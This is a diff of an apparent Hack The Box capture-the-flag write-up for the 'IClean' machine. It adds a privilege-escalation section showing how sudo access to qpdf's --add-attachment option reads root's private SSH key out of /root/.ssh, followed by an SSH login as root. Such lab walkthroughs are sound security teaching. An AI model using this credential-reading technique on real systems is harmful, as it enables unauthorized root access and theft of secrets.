@@ -91,7 +91,7 @@ One of the method to achieve this is using the below payload (it should be perce
 
 As shown below, we can easily intercept the cookie:
 
-![03-cookie_exfiltration](https://github.com/amalcew/htb-writeups/assets/73908014/4964f7a8-30a4-4e1f-b75b-994457b97d4d)
+![03-cookie_exfiltration](https://github.com/amalcew/htb-writeups/assets/73908014/e6639159-db68-437a-af10-9613d2c1c4d7)
 
 After adding the cookie to the session (in the browser or in Burp) I've accessed the dashboard
 
@@ -267,4 +267,83 @@ consuela@iclean:~$ ls
 user.txt
 consuela@iclean:~$ cat user.txt 
 df****************************76
+```
+
+## Privileges escalation
+
+To elevate the access to root we can use a `qpdf` tool that is available to run with sudo privs:
+
+```bash
+consuela@iclean:~$ sudo -l
+[sudo] password for consuela: 
+Matching Defaults entries for consuela on iclean:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User consuela may run the following commands on iclean:
+    (ALL) /usr/bin/qpdf
+```
+
+This tool is probably used by the machine to generate the invoices, but should not be run with `sudo` as it is possible to unprivileged file exfiltration on the system, [using  `--add-attachment` flag](https://qpdf.readthedocs.io/en/stable/cli.html?source=post_page-----cfc46f351353--------------------------------#option-add-attachment). With this method, we can access any file present in `/root` directory, like the root flag or **id_rsa** that will allow to gain root access over the machine:
+
+```bash
+consuela@iclean:~$ sudo /usr/bin/qpdf --empty ~/rsa.txt --qdf --add-attachment /root/.ssh/id_rsa --
+consuela@iclean:~$ cat rsa.txt 
+%PDF-1.3
+%����
+%QDF-1.0
+
+... SNIP ...
+
+  /Type /EmbeddedFile
+  /Length 6 0 R
+>>
+stream
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3********************************************************************
+**********************************************************************
+**********************************************************************
+**********************************************************************
+**********************************************************************
+**********************************************************************
+**********************************************************************
+****BQ==
+-----END OPENSSH PRIVATE KEY-----
+endstream
+endobj
+
+... SNIP ...
+```
+
+With the root private key we can log in as root via ssh:
+
+```bash
+> ssh -i data/root_id_rsa root@10.10.11.12
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+  System information as of Sat May 11 03:54:27 PM UTC 2024
+
+
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+3 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Fri May 10 18:32:55 2024 from xx.xx.xx.xx
+root@iclean:~# cat root.txt 
+49****************************08
 ```
